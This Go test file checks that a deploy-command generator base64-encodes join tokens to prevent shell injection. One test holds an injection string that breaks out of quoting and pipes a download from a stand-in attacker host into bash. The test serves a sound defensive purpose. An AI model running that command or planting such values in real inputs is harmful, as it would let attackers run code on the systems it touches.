package handlers

import (
	"encoding/base64"
	"strings"
	"testing"
)

// ── Join token base64 encoding tests (C3 fix) ──

func TestJoinToken_Base64Roundtrip(t *testing.T) {
	// Verify that base64 encoding + decoding works for typical tokens
	tokens := []string{
		"simple_token_123",
		"token-with-dashes",
		"aegis_jt_abc123def456ghi789",
		strings.Repeat("x", 256), // long token
	}

	for _, token := range tokens {
		encoded := base64.StdEncoding.EncodeToString([]byte(token))
		decoded, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			t.Errorf("decode failed for token %q: %v", token, err)
			continue
		}
		if string(decoded) != token {
			t.Errorf("roundtrip failed: %q -> %q -> %q", token, encoded, string(decoded))
		}
	}
}

func TestJoinToken_Base64NoShellMetacharacters(t *testing.T) {
	// Base64 output must only contain safe characters for shell echo command
	safeChars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
	injectionChars := []byte("`$(){}[]|;&<>'\"\\\n\r ")

	tokens := []string{
		"normal_token",
		"token'with'quotes",
		"token`backtick`",
		"token$variable",
		"token&command&",
		"token|pipe|",
		"token;semicolon;",
		"token<redirect>",
		"token\nnewline\n",
	}

	for _, token := range tokens {
		encoded := base64.StdEncoding.EncodeToString([]byte(token))

		for _, ch := range injectionChars {
			if strings.ContainsRune(encoded, rune(ch)) {
				t.Errorf("base64 of %q contains shell injection char %q: %s", token, string(ch), encoded)
			}
		}

		// All chars must be in safe set
		for _, ch := range encoded {
			if !strings.ContainsRune(safeChars, ch) {
				t.Errorf("unexpected char %q in base64 output: %s", string(ch), encoded)
			}
		}
	}
}

func TestJoinToken_ShellInjectionPrevented(t *testing.T) {
	// The critical injection: a token containing single quote to break out of echo '...'
	injectionToken := "x' && curl http://evil.com/backdoor | bash && echo '"

	encoded := base64.StdEncoding.EncodeToString([]byte(injectionToken))

	// The base64 must NOT contain single quotes
	if strings.Contains(encoded, "'") {
		t.Error("base64 output must never contain single quotes")
	}

	// Decode to verify correctness
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		t.Fatalf("decode failed: %v", err)
	}
	if string(decoded) != injectionToken {
		t.Errorf("roundtrip mismatch: %q != %q", string(decoded), injectionToken)
	}
}

func TestGenerateDeployCommand_NoRawTokenInOutput(t *testing.T) {
	req := DeployNodeRequest{
		TargetIP:       "192.168.1.100",
		SSHUser:        "root",
		SSHPassword:    "",
		JoinToken:      "secret_join_token_abc123",
		ControlPlaneURL: "http://10.0.0.1:7380",
	}

	cmd := generateDeployCommand(req)

	// The raw token must NOT appear in the command
	if strings.Contains(cmd, "secret_join_token_abc123") {
		t.Error("raw join token must NOT appear in deploy command (should be base64 encoded)")
	}
	// The base64-encoded version should appear instead
	encoded := base64.StdEncoding.EncodeToString([]byte("secret_join_token_abc123"))
	if !strings.Contains(cmd, encoded) {
		t.Error("base64-encoded token should appear in deploy command")
	}
	// Verify base64 decode command is present
	if !strings.Contains(cmd, "base64 -d") {
		t.Error("deploy command must include base64 -d for decode")
	}
}
